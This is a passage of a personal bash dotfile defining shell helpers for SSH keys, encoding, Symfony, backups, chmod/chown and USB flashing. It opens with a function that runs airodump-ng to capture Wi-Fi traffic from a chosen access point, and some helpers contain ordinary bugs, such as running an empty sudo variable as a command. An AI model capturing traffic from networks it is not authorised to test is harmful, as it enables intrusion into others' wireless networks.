    # Check airodump-ng installation
    #--------------------------------------------------

    if [ -z "$(command -v 'airodump-ng')" ]; then
        _echo_danger 'error: airodump-ng not installed, try "sudo apt-get install -y aircrack-ng"\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${arguments[${LBOUND}]}" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -n "${arguments[${LBOUND}]}" ]; then
        target="${arguments[${LBOUND}]}"
    fi

    #--------------------------------------------------

    if [ -z "${target}" ] || [ -z "${channel}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    # check mac adress format valid
    if [[ ! "${target}" =~ ^([a-zA-Z0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; then
        _echo_danger "error: wrong mac address format ${target}\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ "${write}" = true ]; then
        file="$(echo "${target}" | tr : -)"

        _echo_info "mkdir \"$(pwd)/${file}\"\n"
        mkdir "$(pwd)/${file}"

        _echo_info "sudo airodump-ng --bssid \"${target}\" --channel \"${channel}\" --write \"$(pwd)/${file}/${file}\" \"${wifi_adapter}\"\n"
        sudo airodump-ng --bssid "${target}" --channel "${channel}" --write "$(pwd)/${file}/${file}" "${wifi_adapter}"

    elif [ "${write}" = false ]; then

        _echo_info "sudo airodump-ng --bssid \"${target}\" --channel \"${channel}\" \"${wifi_adapter}\"\n"
        sudo airodump-ng --bssid "${target}" --channel "${channel}" "${wifi_adapter}"
    fi
}

## Switch default ssh id
function switch-default-ssh() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'switch-default-id -h (help)\n'
    }

    #--------------------------------------------------

    _alert_primary 'switch ssh identity'

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local file_name
    local identities=()
    local identity

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'switch-default-id\n';
                _echo_success 'description:' 2 14; _echo_primary 'Switch default ssh id\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------

    # list installed identities
    while read -r file_path; do
        file_name=$(basename "${file_path}" .pub)
        # remove "id_rsa_" prefix from file name
        identities+=("${file_name#id_rsa_}")
    done < <(find ~/.ssh -type f -name '*.pub' -not -name 'id_rsa.pub')

    if [ "${#identities[@]}" -eq 0 ]; then
        _echo_danger 'error: no extra identities found\n'

        return 1
    fi

    #--------------------------------------------------

    # prompt user for desired identity
    PS3=$(_echo_success 'Please select identity : ')
    select identity in "${identities[@]}"; do
        # validate selection
        for ITEM in "${identities[@]}"; do
            # find selected container
            if [[ "${ITEM}" == "${identity}" ]]; then
                # break two encapsulation levels
                break 2;
            fi
        done
    done

    #--------------------------------------------------

    _alert_warning "setting ${identity} as default identity"

    #--------------------------------------------------

    _echo_info "cp -fv ~/.ssh/id_rsa_\"${identity}\" ~/.ssh/id_rsa\n"
    cp -fv ~/.ssh/id_rsa_"${identity}" ~/.ssh/id_rsa

    _echo_info "cp -fv ~/.ssh/id_rsa_\"${identity}\".pub ~/.ssh/id_rsa.pub\n"
    cp -fv ~/.ssh/id_rsa_"${identity}".pub ~/.ssh/id_rsa.pub

    _echo_warning 'add ssh identity\n'

    _echo_info 'ssh-add ~/.ssh/id_rsa\n'
    ssh-add ~/.ssh/id_rsa

    _echo_info 'ssh-add -l\n'
    ssh-add -l
}

#--------------------------------------------------
# string aliases
#--------------------------------------------------

alias trim="sed -E 's/^[[:space:]]*//'|sed -E 's/[[:space:]]*$//'" ## Trim given string

## Decode string from base64 format
function decode() {
    #--------------------------------------------------
    # Check base64 installation
    #--------------------------------------------------

    if [ ! -x "$(command -v base64)" ]; then
        _echo_danger 'error: base64 required, enter: "sudo apt-get install -y base64" to install\n'
        return 1
    fi

    #--------------------------------------------------

    if [ -z "${*}" ]; then
        _echo_danger 'error: some mandatory argument missing\n'
        _echo_success 0 8 'usage:'; _echo_primary 'decode [string]\n'
        return 1
    fi

    if [ "$#" -gt 1 ]; then
        _echo_danger "error: too many arguments ($#)\n"
        _echo_success 0 8 'usage:'; _echo_primary 'decode [string]\n'
        return 1
    fi

    #--------------------------------------------------

    echo "$@" | base64 --decode
}

## Encode string from base64 format
function encode() {
    #--------------------------------------------------
    # Check base64 installation
    #--------------------------------------------------

    if [ ! -x "$(command -v base64)" ]; then
        _echo_danger 'error: base64 required, enter: "sudo apt-get install -y base64" to install\n'
        return 1
    fi

    #--------------------------------------------------

    if [ -z "${*}" ]; then
        _echo_danger 'error: some mandatory argument missing\n'
        _echo_success 0 8 'usage:'; _echo_primary 'encode [string]\n'
        return 1
    fi

    #--------------------------------------------------

    echo "$@" | base64
}

## Generate random string
function random-string() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'random-string [length] -v (verbose) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local length
    local verbose=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :vh option; do
            case "${option}" in
                v) verbose=true;;
                h) _echo_warning 'random-string\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Generate random string\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------

    if [ "${#arguments[@]}" -eq 0 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments ($#)\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    length=${arguments[${LBOUND}]}

    #--------------------------------------------------

    if [[ ! "${length}" =~ [0-9] ]]; then
        _echo_danger "error: invalid argument ($1)\n"
        _usage 2 8
        return 1
    fi

    if [ "${verbose}" = true ]; then
        _echo_info "< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w \"${length}\" | head -n 1\n"
    fi

    < /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w "${length}" | head -n 1
}

## Decode string froml URL format
function urldecode() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'urldecode -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local result

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'urldecode\n';
                _echo_success 'description:' 2 14; _echo_primary 'Decode string froml URL format\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check shell compatibility
    #--------------------------------------------------

    if [ "${SHELL}" != '/bin/bash' ]; then
        _echo_danger 'error: your shell is not compatible with this function\n'
        return 1
    fi

    #--------------------------------------------------

    if [ -z "$1" ]; then
        _echo_danger 'error: some mandatory argument missing\n'
        _usage 2 8
        return 1
    fi

    if [ "$#" -gt 1 ]; then
        _echo_danger "error: too many arguments ($#)\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    # Returns a string in which the sequences with percent (%) signs followed by
    # two hex digits have been replaced with literal characters.
    #
    # This is perhaps a risky gambit, but since all escape characters must be
    # encoded, we can replace %NN with \xNN and pass the lot to printf -b, which
    # will decode hex for us
    printf -v result '%b' "${1//%/\\x}"

    echo "${result}"
}

## Encode string froml URL format
function urlencode() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'urlencode -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local char
    local length
    local out
    local POS
    local result
    local string

    #--------------------------------------------------
    # Parse options
    #--------------------------------------------------

    local option
    while getopts :h option; do
        case "${option}" in
            h) _echo_warning 'urlencode\n';
                _echo_success 'description:' 2 14; _echo_primary 'Encode string froml URL format\n'
                _usage 2 14
                return 0;;
            \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                return 1;;
        esac
    done

    #--------------------------------------------------
    # Check shell compatibility
    #--------------------------------------------------

    if [ "${SHELL}" != '/bin/bash' ]; then
        _echo_danger 'error: your shell is not compatible with this function\n'
        return 1
    fi

    #--------------------------------------------------

    if [ -z "${*}" ]; then
        _echo_danger 'error: some mandatory argument missing\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    string="${*}"
    length=${#string}

    #--------------------------------------------------

    for (( POS=0 ; POS<length ; POS++ )); do
        char=${string:${POS}:1}
        case "${char}" in 
            [-_.~a-zA-Z0-9] ) out=${char} ;;
            * ) printf -v out '%%%02x' "'${char}";;
        esac
        result+="${out}"
    done

    echo "${result}"
}

## Returns appropriate symfony console location
function sf() {
    #--------------------------------------------------
    # Check php installation
    #--------------------------------------------------

    if [ ! -x "$(command -v php)" ]; then
        _echo_danger 'error: php required, enter: "sudo apt-get install -y php" to install\n'
        return 1
    fi

    #--------------------------------------------------

    if [ -x ./app/console ]; then
        _echo_info "php -d memory-limit=-1 ./app/console \"$*\"\n"
        php -d memory-limit=-1 ./app/console "$@"

    elif [ -x ./bin/console ]; then
        _echo_info "php -d memory-limit=-1 ./bin/console \"$*\"\n"
        php -d memory-limit=-1 ./bin/console "$@"
    else
        _echo_danger 'error: no symfony console executable found\n'
        return 1
    fi
}

#--------------------------------------------------
# Symfony aliases
#--------------------------------------------------

alias cache='sf cache:clear --env=prod'                            ## Clears the cache
alias router='sf debug:router'                                     ## Debug router
alias schema-update='sf doctrine:schema:update --dump-sql --force' ## Update database shema
alias services='sf debug:container'                                ## Debug container
alias warmup='sf cache:warmup --env=prod'                          ## Warms up an empty cache

## Start project debug server
function sf-dump-server() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'sf-server-dump -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local console

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'sf-dump-server\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Start project debug server\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check php installation
    #--------------------------------------------------

    if [ ! -x "$(command -v php)" ]; then
        _echo_danger 'error: php required, enter: "sudo apt-get install -y php" to install\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    # find correct console executable
    if [ -x ./app/console ]; then
        console=./app/console

    elif [ -x ./bin/console ]; then
        console=./bin/console
    else
        _echo_danger 'error: no symfony console executable found\n'
        return 1
    fi

    #--------------------------------------------------

    _echo_info "php -d memory-limit=-1 ${console} server:dump --env=dev\n"
    php -d memory-limit=-1 ${console} server:dump --env=dev
}

## Start Symfony binary server
function sf-server() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'sf-server -t (enable tls)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local enable_tls=false

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :th option; do
            case "${option}" in
                t) enable_tls=true;;
                h) _echo_warning 'sf-server\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Start Symfony binary server\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Check symfony cli installation
    #--------------------------------------------------

    if [ -z "$(command -v symfony)" ]; then
        _echo_danger 'error: symfony cli binary required\n'
        return 1
    fi

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ "${enable_tls}" = true ]; then
        _echo_info 'symfony serve\n'
        symfony serve
    else
        _echo_info 'symfony serve --no-tls\n'
        symfony serve --no-tls
    fi
}

#--------------------------------------------------
# system aliases
#--------------------------------------------------

alias systemct-list='systemctl list-unit-files | grep enabled' ## List enabled services

## Synchronize destination folder with source with rsync
function backup() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'backup [source] [destination] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local source
    local destination

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'backup\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Synchronize destination folder with source with rsync\n'
                    _usage 2 14
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -lt 2 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 2 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # get source and destination realpath excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"
    destination="$(realpath "${arguments[((${LBOUND} + 1))]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    if [ ! -d "${source}" ]; then
        _echo_danger 'error: source folder not found\n'
        _usage
    fi

    if [ ! -d "${destination}" ]; then
        _echo_danger 'error: destination folder not found\n'
        _usage
    fi

    #--------------------------------------------------
    # Format argument
    #--------------------------------------------------

    # append forward slash to the source path
    source="${source}/"

    #--------------------------------------------------

    _echo_warning "Copying \"${source}\" to \"${destination}\"\n"
    _echo_warning "Some data in \"${destination}\" may be lost\n"
    _echo_success 'Are you sure you want to continue ? (yes/no) [no]: '
    read -r USER_PROMPT

    if [[ ! "${USER_PROMPT}" =~ ^[Yy](ES|es)?$ ]]; then
        _echo_warning 'operation canceled\n'
        return 0
    fi

    _echo_info "rsync -avuz \"${source}\" \"${destination}\" --delete --exclude='/.*' --exclude='/snap' --exclude='/VirtualBox VMs'\n"
    rsync -avuz "${source}" "${destination}" --delete --exclude='/.*' --exclude='/snap' --exclude='/VirtualBox VMs'

    # -a (archive mode): This is a crucial option. It's a shorthand for several other options that ensure a comprehensive copy, including:
    #   -r (recursive): Copies directories recursively. Important if source_folder contains subdirectories.
    #   -l (links): Preserves symbolic links.
    #   -t (times): Preserves modification times. This is essential for the update-only functionality.
    #   -g (groups): Preserves group ownership.
    #   -o (owners): Preserves owner ownership.
    #   -p (perms): Preserves permissions.
    #   -D (devices): Preserves device files (if applicable).
    # -v (verbose): Increases verbosity, showing you what files are being transferred. Helpful for monitoring the process.
    # -u (update): This is the key. It tells rsync to only transfer files that are newer in the source directory than in the destination directory, or if the file doesn't exist in the destination. Files that are identical in both source and destination (based on modification time and size) will be skipped.
    # -z (compress): Compresses the data during transfer. Helpful for large files or slow connections.
    # --delete: This option is crucial for ensuring that the destination folder mirrors the source folder. It deletes files in the destination that do not exist in the source.
    # --exclude='/.*': This option tells rsync to exclude any files or directories whose names start with a dot (.). This effectively excludes hidden files and directories, that are located directly inside of the source folder.
    # --dry-run: Before running the command with --delete, you can perform a dry run to see what changes would be made without actually making them. Use the -n or --dry-run.
    #
    # Trailing slashes: Note the trailing slash on source_folder/. This is important!
    # With the trailing slash (source_folder/), rsync copies the contents of source_folder into destination_folder.
    # Without the trailing slash (source_folder), rsync copies the source_folder itself into destination_folder, creating destination_folder/source_folder.
}

## Create new user
function create-user() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'create-user [new_user] -g [group] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local new_user
    local group

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :g:h option; do
            case "${option}" in
                g) group="${OPTARG}";;
                h) _echo_warning 'create-user\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create new user and adds to desired group\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    new_user=${arguments[${LBOUND}]}

    #--------------------------------------------------

    _echo_info "sudo adduser \"${new_user}\"\n"
    sudo adduser "${new_user}"

    if [ -z "${group}" ]; then
        return 0;
    fi

    if ! groups | grep -q "${group})"; then
        _echo_info "sudo addgroup \"${group}\"\n"
        sudo addgroup "${group}"
    fi

    _echo_info "sudo adduser \"${new_user}\" \"${group}\"\n"
    sudo adduser "${new_user}" "${group}"
}

alias disks='drives'   ## drives alias

## List connected drives (ignore loop devices)
function drives() {
    _echo_info 'lsblk -l | grep -v loop\n'
    lsblk -l | grep -v loop

    if [ -x "$(command -v df)" ]; then
        _echo_info 'df -h | grep -v loop\n'
        df -h | grep -v loop
    fi

    _echo_info 'df -hT -x squashfs\n'
    df -hT -x squashfs

    if [ -x "$(command -v blkid)" ]; then
        _echo_info "sudo blkid | grep -v '/dev/loop'\n"
        sudo blkid | grep -v '/dev/loop'
    fi

    if [ -x "$(command -v fdisk)" ]; then
        _echo_info 'sudo fdisk -l\n'
        sudo fdisk -l
    fi
}

## Create bootable usb flash drive from iso file or generate iso file from source
function flash-bootable-iso() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'flash-bootable-iso [source] [device (eg: /dev/sdb)] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local source
    local destination

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :h option; do
            case "${option}" in
                h) _echo_warning 'flash-bootable-iso\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create bootable usb drive from iso file or generate iso file from source\n'
                    _usage 2 14
                    _echo_success 'note:' 2 14; _echo_warning 'List available drives with "drives" alias\n'
                    return 0;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${#arguments[@]}" -lt 2 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 2 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    source="${arguments[${LBOUND}]}"
    destination=${arguments[((${LBOUND} + 1))]}

    #--------------------------------------------------

    if [ -z "${source}" ]; then
        _echo_danger 'error: source parameter is missing\n'
        _usage
    fi

    if [ -z "${destination}" ]; then
        _echo_danger 'error: destination parameter is missing\n'
        _usage
    fi

    _echo_warning "Writing \"${source}\" to \"${destination}\"\n"
    _echo_warning "All data on drive \"${destination}\" will be lost\n"
    _echo_success 'Are you sure you want to continue ? (yes/no) [no]: '
    read -r USER_PROMPT

    if [[ ! "${USER_PROMPT}" =~ ^[Yy](ES|es)?$ ]]; then
        _echo_warning 'operation canceled\n'
        return 0
    fi

    # dd: This is a command-line utility for Unix and Unix-like operating systems whose primary purpose is to convert and copy files.
    # if="ubuntu-24.04-desktop-amd64.iso": This sets the input file (if) for the dd command. In this case, the input file is an image of the Ubuntu 24.04 operating system.
    # of="/dev/sdb": This sets the output file (of) for the dd command. Here, the output file is a device file which represents your USB stick.
    # bs=16M: This sets the block size (bs) for the dd command. The dd command will read and write up to 16M bytes at a time.
    # status=progress: This option shows the progress of the copy operation.
    # oflag=sync: This option uses synchronous I/O for data. This ensures that the dd command will not finish until all data is actually written to the USB stick.
    # oflag=direct: This option tells dd to try and use the most efficient method to write data to the destination. The direct option attempts to bypass the filesystem buffer and write directly to the storage device, which can improve performance for raw data copying.
    # https://tails.net/install/expert/index.fr.html#install

    _echo_info "sudo dd if=\"${source}\" of=\"${destination}\" bs=16M oflag=direct status=progress\n"
    sudo dd if="${source}" of="${destination}" bs=16M oflag=direct status=progress

    _echo_warning "bs=16M: This sets the block size (bs) for the dd command. The dd command will read and write up to 16M bytes at a time.\n"
    _echo_warning "oflag=direct: This option tells dd to try and use the most efficient method to write data to the destination. The direct option attempts to bypass the filesystem buffer and write directly to the storage device, which can improve performance for raw data copying.\n"

    # flush usb drive buffers
    _echo_info 'sync\n'
    sync
}

## Change files mode recursively
function mod() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'mod (source) -m [mode] -r (recursive) -d (default=664) -x (executable=775) -X (executable=777) -s (sudo) -h (help)\n'
    }

    #--------------------------------------------------
    # Declare subfunction
    #--------------------------------------------------

    function _mod() {
        # $1 = mode ; $2 = source ; $3 = sudo
        if [ "$3" = true ]; then
            _echo_info "sudo chmod \"$1\" \"$2\"\n"
            sudo chmod "$1" "$2"
        else
            _echo_info "chmod \"$1\" \"$2\"\n"
            chmod "$1" "$2"
        fi
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    # 664: rw-rw-r-- default file
    # 755: rwxr-xr-x default folder
    # 775: rwxrwxr-x default executable
    local mode='664'
    local recursive=false
    local source
    local use_sudo

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :drsxXm:h option; do
            case "${option}" in
                d) mode='664';;
                r) recursive=true;;
                s) use_sudo=false;;
                x) mode='775';;
                X) mode='777';;
                m) mode="${OPTARG}";;
                h) _echo_warning 'mod\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Change files mode recursively\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    # Check argument count
    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    if [[ ! "${mode}" =~ ^[0-7]+$ ]]; then
        _echo_danger 'error: some mandatory parameter is invalid\n'
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    # Check source validity
    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: source: \"${source}\" is invalid\n"
        _usage 2 8

        return 1
    fi

    if [ ! -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_danger "error: source: \"${source}\" is not a valid directory\n"
        _usage 2 8

        return 1
    fi

    #--------------------------------------------------
    # Execute command
    #--------------------------------------------------

    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        # Find all files recursively
        find "${source}" -type f | while read -r FILE
        do
            _mod "${mode}" "${FILE}" "${use_sudo}"
        done

        return 0
    fi

    if [ -d "${source}" ]; then
        # Find all files inside given folder
        find "${source}" -maxdepth 1 -type f | while read -r FILE
        do
            _mod "${mode}" "${FILE}" "${use_sudo}"
        done

        return 0
    fi

    if [ -f "${source}" ]; then
        _mod "${mode}" "${source}" "${use_sudo}"

        return 0
    fi
}

## Own files and folders
function own() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'own (source) -u [user] -g [group] -n (nobody:nogroup) -R (root) -r (recursive) -s (sudo) -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local command=chown
    local group
    local recursive=false
    local source
    local use_sudo
    local user
    # set default user
    user="$(whoami)"

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :nrRsu:g:h option; do
            case "${option}" in
                n) user=nobody;group=nogroup;;
                r) recursive=true;;
                R) user=root;;
                s) use_sudo=sudo; command='sudo chown';;
                u) user="${OPTARG}";;
                g) group="${OPTARG}";;
                h) _echo_warning 'own\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Own files and folders\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ "${arguments[${LBOUND}]}" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    # Check argument count
    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------

    if [ -z "${group}" ]; then
        group="${user}"
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    # excluding last forward slash if any
    source="$(realpath "${arguments[${LBOUND}]}")"

    #--------------------------------------------------
    # Validate argument type
    #--------------------------------------------------

    # Check source validity
    if [ ! -f "${source}" ] && [ ! -d "${source}" ]; then
        _echo_danger "error: source: \"${source}\" is invalid\n"
        _usage 2 8

        return 1
    fi

    if [ ! -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_danger "error: source: \"${source}\" is not a valid directory\n"
        _usage 2 8

        return 1
    fi

    #--------------------------------------------------

    if [ -d "${source}" ] && [ "${recursive}" = true ]; then
        _echo_info "${command} \"${user}:${group}\" -R \"${source}\"\n"
        "${use_sudo}" chown "${user}:${group}" -R "${source}"

        return 0
    fi

    if [ -d "${source}" ] && [ "${recursive}" = false ]; then
        _echo_info "${command} \"${user}:${group}\" \"${source}\"\n"
        "${use_sudo}" chown "${user}:${group}" "${source}"

        return 0
    fi

    if [ -f "${source}" ]; then
        _echo_info "${command} \"${user}:${group}\" \"${source}\"\n"
        "${use_sudo}" chown "${user}:${group}" "${source}"
    fi
}

## Install package on multiple systems
function pkg-install() {

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local distro=''

    #--------------------------------------------------
    # Check argument count
    #--------------------------------------------------

    if [ "$#" -lt 1 ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _echo_success 0 8 'usage:'; _echo_primary 'pkg-install [package_name]\n'
        return 1
    fi

    #--------------------------------------------------

    # check distribution
    if [ "$(uname)" = 'Linux' ]; then
        if [ -f /etc/redhat-release ] ; then
            distro='RedHat'
        elif [ -f /etc/debian_version ] ; then
            distro='Debian'
        elif [ -f /etc/alpine-release ] ; then
            distro='Alpine'
        elif [ -f /etc/os-release ] ; then
            # shellcheck disable=SC2002
            distro_ID=$(cat /etc/os-release | grep  ID= | grep -v "BUILD" | cut -d= -f2-)
            if [ "${distro_ID}" = 'kali' ] ; then
                distro='Kali'
